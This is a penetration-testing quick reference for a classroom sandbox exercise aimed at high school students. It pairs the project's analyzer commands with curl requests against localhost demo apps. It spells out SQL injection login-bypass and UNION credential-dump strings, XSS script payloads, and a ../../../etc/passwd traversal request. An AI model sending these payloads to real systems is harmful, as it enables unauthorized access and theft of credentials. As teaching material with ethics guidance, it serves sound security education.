# Penetration Testing - Quick Reference

## 🚀 Essential Commands

### Penetration Testing Methodology
```bash
# Phase 1: Reconnaissance
python src/analyzer/network_cli.py --scan-services localhost --educational
python src/analyzer/dast_cli.py http://localhost:5000 --quick --educational

# Phase 2: Vulnerability Assessment  
python src/analyzer/analyze_cli.py samples/vulnerable-flask-app --educational
python src/analyzer/dast_cli.py http://localhost:5000 --deep-scan --educational

# Phase 3: Exploitation (controlled environment only)
curl -X POST "http://localhost:5000/login" -d "username=admin' OR '1'='1&password=test"
curl "http://localhost:5000/search?q=<script>alert('XSS')</script>"

# Phase 4: Post-Exploitation Analysis
python samples/backdoor-apps/backdoor_app.py &
python src/analyzer/network_cli.py --monitor-connections --duration 60 --educational
```

### Integrated Analysis Commands
```bash
# Full security assessment (all modules)
python src/analyzer/analyze_cli.py samples/ --educational --output reports/pentest_sast.json
python src/analyzer/dast_cli.py --demo-apps --educational --output reports/pentest_dast.json
python src/analyzer/network_cli.py --monitor-connections --educational --output reports/pentest_network.json

# Generate comprehensive report package
ls -la reports/pentest_*
```

## 🔍 Reconnaissance Techniques

### Network Discovery
```bash
# Service discovery
python src/analyzer/network_cli.py --scan-services localhost --educational
python src/analyzer/network_cli.py --scan-services localhost --ports 21,22,23,25,53,80,443,993,995,3389,5900

# Connection monitoring
python src/analyzer/network_cli.py --monitor-connections --educational --duration 300

# DNS analysis
python src/analyzer/network_cli.py --dns-analysis --educational --duration 60
```

### Web Application Enumeration
```bash
# Basic enumeration
python src/analyzer/dast_cli.py http://localhost:5000 --quick --educational
python src/analyzer/dast_cli.py http://localhost:8080 --quick --educational

# Deep enumeration
python src/analyzer/dast_cli.py http://localhost:5000 --deep-scan --educational
python src/analyzer/dast_cli.py --demo-apps --educational

# Manual enumeration
curl -I http://localhost:5000                    # Headers
curl http://localhost:5000/robots.txt            # Robots file
curl http://localhost:5000/sitemap.xml           # Sitemap
```

### Technology Stack Analysis
```bash
# Static code analysis for tech stack
python src/analyzer/analyze_cli.py samples/vulnerable-flask-app --educational --verbose
python src/analyzer/analyze_cli.py samples/unsecure-pwa --educational --verbose

# Dependency analysis
python src/analyzer/analyze_cli.py samples/vulnerable-flask-app --check-dependencies
python src/analyzer/analyze_cli.py samples/unsecure-pwa --check-dependencies
```

## 🎯 Vulnerability Assessment

### SAST Integration
```bash
# Comprehensive static analysis
python src/analyzer/analyze_cli.py samples/vulnerable-flask-app --educational
python src/analyzer/analyze_cli.py samples/unsecure-pwa --educational
python src/analyzer/analyze_cli.py samples/suspicious-scripts --educational

# Focus on exploitable vulnerabilities
python src/analyzer/analyze_cli.py samples/vulnerable-flask-app --severity high,critical
```

### DAST Integration
```bash
# Runtime vulnerability testing
python src/analyzer/dast_cli.py http://localhost:5000 --test-xss --test-sqli --educational
python src/analyzer/dast_cli.py http://localhost:8080 --test-xss --test-sqli --educational

# Security header analysis
python src/analyzer/dast_cli.py http://localhost:5000 --check-headers --educational
```

### Network Analysis Integration
```bash
# Baseline traffic analysis
python samples/network-scenarios/basic_network_activity.py 120 &
python src/analyzer/network_cli.py --capture-traffic --duration 130 --educational

# Suspicious pattern detection
python samples/network-scenarios/suspicious_traffic_generator.py 120 &
python src/analyzer/network_cli.py --monitor-connections --duration 130 --educational
```

### Risk Prioritization Matrix
```bash
# High Priority Targets (Critical + Exploitable)
# 1. SQL Injection in login forms
# 2. XSS in user input fields  
# 3. Debug mode enabled
# 4. Weak authentication mechanisms
# 5. Unvalidated redirects

# Medium Priority Targets
# 6. Missing security headers
# 7. Information disclosure
# 8. Session management issues
# 9. Input validation problems
# 10. Configuration weaknesses
```

## ⚔️ Controlled Exploitation

### SQL Injection Testing
```bash
# Basic authentication bypass
curl -X POST "http://localhost:5000/login" \
  -d "username=admin' OR '1'='1&password=anything" \
  -H "Content-Type: application/x-www-form-urlencoded"

# Union-based injection
curl -X POST "http://localhost:5000/search" \
  -d "query=' UNION SELECT username,password FROM users--" \
  -H "Content-Type: application/x-www-form-urlencoded"

# Error-based injection
curl -X POST "http://localhost:5000/login" \
  -d "username=admin' AND (SELECT COUNT(*) FROM users)>0--&password=test" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

### Cross-Site Scripting (XSS)
```bash
# Reflected XSS
curl "http://localhost:5000/search?q=<script>alert('Reflected XSS')</script>"
curl "http://localhost:5000/user?name=<img src=x onerror=alert('XSS')>"

# Stored XSS
curl -X POST "http://localhost:5000/comment" \
  -d "comment=<script>alert('Stored XSS')</script>" \
  -H "Content-Type: application/x-www-form-urlencoded"

# DOM-based XSS
curl "http://localhost:5000/profile#<img src=x onerror=alert('DOM XSS')>"
```

### Configuration Exploitation
```bash
# Debug mode information disclosure
curl "http://localhost:5000/debug" -v
curl "http://localhost:5000/config" -v

# Default credentials testing
curl -X POST "http://localhost:8080/login" \
  -d "username=admin&password=admin" \
  -H "Content-Type: application/x-www-form-urlencoded"

# Directory traversal
curl "http://localhost:5000/file?name=../../../etc/passwd"
curl "http://localhost:5000/download?file=../../../../etc/hosts"
```

### Authentication Bypass
```bash
# Session manipulation
curl -X GET "http://localhost:5000/admin" \
  -H "Cookie: session=modified_session_value"

# Parameter pollution
curl -X POST "http://localhost:5000/login" \
  -d "username=user&username=admin&password=test" \
  -H "Content-Type: application/x-www-form-urlencoded"

# HTTP method bypass
curl -X PUT "http://localhost:5000/admin/users"
curl -X DELETE "http://localhost:5000/admin/users/1"
```

## 🔍 Post-Exploitation Analysis

### Persistence Simulation
```bash
# Backdoor communication patterns
python samples/backdoor-apps/backdoor_app.py &
python src/analyzer/network_cli.py --monitor-connections --duration 120 --educational

# Persistence mechanism analysis
python samples/network-scenarios/backdoor_simulation.py 90 &
python src/analyzer/network_cli.py --capture-traffic --duration 100 --educational
```

### Data Exfiltration Patterns
```bash
# Monitor exfiltration traffic
python samples/network-scenarios/backdoor_simulation.py 120 &
python src/analyzer/network_cli.py --dns-analysis --duration 130 --educational

# DNS tunneling detection
python samples/network-scenarios/dns_threat_scenarios.py 60 &
python src/analyzer/network_cli.py --dns-analysis --duration 70 --educational
```

### Lateral Movement Simulation
```bash
# Internal network discovery
python src/analyzer/network_cli.py --scan-services 127.0.0.1 --educational

# Suspicious network patterns
python samples/network-scenarios/suspicious_traffic_generator.py 60 &
python src/analyzer/network_cli.py --monitor-connections --duration 70 --educational
```

## 📊 Professional Reporting

### Report Generation Commands
```bash
# Generate all analysis reports
python src/analyzer/analyze_cli.py samples/ --educational --output reports/pentest_final_sast.json
python src/analyzer/dast_cli.py --demo-apps --educational --output reports/pentest_final_dast.json
python src/analyzer/network_cli.py --demo-network --educational --output reports/pentest_final_network.json

# Review generated reports
ls -la reports/pentest_*
head -20 reports/pentest_*.json
```

### Risk Assessment Framework
```bash
# CVSS Base Score Calculation
# Exploitability Metrics:
# - Attack Vector (Network/Adjacent/Local/Physical)
# - Attack Complexity (Low/High)  
# - Privileges Required (None/Low/High)
# - User Interaction (None/Required)

# Impact Metrics:
# - Confidentiality (None/Low/High)
# - Integrity (None/Low/High)
# - Availability (None/Low/High)

# Risk Priority = (Exploitability Score) × (Impact Score)
```

### Executive Summary Template
```markdown
# Penetration Testing Executive Summary

## Assessment Overview
- **Target**: Docker Sandbox Demo Environment
- **Duration**: [Testing Period]
- **Methodology**: OWASP Testing Guide + NIST Framework

## Risk Summary
- **Critical**: X vulnerabilities requiring immediate attention
- **High**: X vulnerabilities requiring prompt remediation  
- **Medium**: X vulnerabilities for planned remediation
- **Low**: X informational findings

## Business Impact
- **Immediate Risk**: [Description]
- **Potential Data Exposure**: [Types of data at risk]
- **Compliance Impact**: [Regulatory considerations]

## Recommendations
1. **Immediate Actions** (0-30 days)
2. **Short-term Improvements** (1-3 months)  
3. **Long-term Strategy** (6-12 months)
```

## 🛡️ Ethical Guidelines Quick Reference

### Legal Boundaries
```bash
# ✅ AUTHORIZED ACTIVITIES (Sandbox Only)
# - Testing provided vulnerable applications
# - Using educational tools on localhost
# - Documenting findings for learning
# - Practicing on owned systems

# ❌ UNAUTHORIZED ACTIVITIES (Never)
# - Testing systems you don't own
# - Accessing production systems
# - Causing damage or disruption
# - Sharing or selling vulnerabilities
```

### Professional Standards
- **Permission**: Always obtain written authorization
- **Scope**: Stay within defined testing boundaries  
- **Documentation**: Record all testing activities
- **Reporting**: Provide actionable findings
- **Confidentiality**: Protect client information

### Incident Response
```bash
# If you accidentally access unauthorized data:
# 1. Stop the activity immediately
# 2. Document what happened
# 3. Report to instructor/supervisor
# 4. Do not access or copy the data
# 5. Follow organizational incident procedures
```

## 🔧 Troubleshooting

### Common Issues and Solutions
```bash
# Services not responding
# Solution: Restart applications
cd samples/vulnerable-flask-app && python app.py &
cd samples/unsecure-pwa && python main.py &

# Permission denied errors
# Solution: Use educational mode
python src/analyzer/network_cli.py --demo-network --educational

# Network tools not available
# Solution: Use built-in alternatives
python src/analyzer/network_cli.py --scan-services localhost --educational
```

### Performance Optimization
```bash
# Reduce output verbosity
python src/analyzer/analyze_cli.py samples/vulnerable-flask-app --quiet

# Focus on specific vulnerability types
python src/analyzer/dast_cli.py http://localhost:5000 --test-sqli --educational

# Limit scan duration
python src/analyzer/network_cli.py --monitor-connections --duration 60 --educational
```

### Environment Validation
```bash
# Check all tools are working
python src/analyzer/analyze_cli.py --help
python src/analyzer/dast_cli.py --help
python src/analyzer/network_cli.py --help

# Verify applications are running
curl -I http://localhost:5000
curl -I http://localhost:8080

# Test network connectivity
python src/analyzer/network_cli.py --scan-services localhost --ports 5000,8080
```

## 📚 Methodology Reference

### OWASP Testing Guide Phases
1. **Information Gathering**
   - Conduct search engine discovery
   - Fingerprint web application framework
   - Map application architecture

2. **Configuration Management**  
   - Test network infrastructure configuration
   - Test application platform configuration
   - Test file extensions handling

3. **Authentication Testing**
   - Test credentials transported over encrypted channel
   - Test default credentials
   - Test weak lock out mechanism

4. **Authorization Testing**
   - Test directory traversal
   - Test privilege escalation
   - Test insecure direct object references

5. **Session Management**
   - Test session token strength
   - Test cookie attributes
   - Test session fixation

### NIST Cybersecurity Framework Integration
- **Identify**: Asset discovery and risk assessment
- **Protect**: Vulnerability remediation recommendations  
- **Detect**: Monitoring and alerting improvements
- **Respond**: Incident response procedure updates
- **Recover**: Business continuity considerations

## 🎯 Career Development

### Industry Certifications
- **CEH**: Certified Ethical Hacker (Entry Level)
- **OSCP**: Offensive Security Certified Professional (Advanced)
- **CISSP**: Certified Information Systems Security Professional (Management)
- **CISM**: Certified Information Security Manager (Leadership)

### Skill Development Path
1. **Foundation**: Complete all sandbox exercises (SAST, DAST, Network, Penetration Testing)
2. **Practice**: Set up home labs with deliberately vulnerable applications
3. **Learning**: Take online courses and read security research
4. **Certification**: Pursue industry-recognized certifications
5. **Experience**: Contribute to open source security projects
6. **Specialization**: Focus on specific areas (web app security, network security, etc.)

---

**Duration**: Reference for 4-5 hour exercise  
**Difficulty**: Advanced  
**Prerequisites**: SAST, DAST, Network Analysis, Sandbox exercises completed  
**Target Audience**: High school students with cybersecurity interest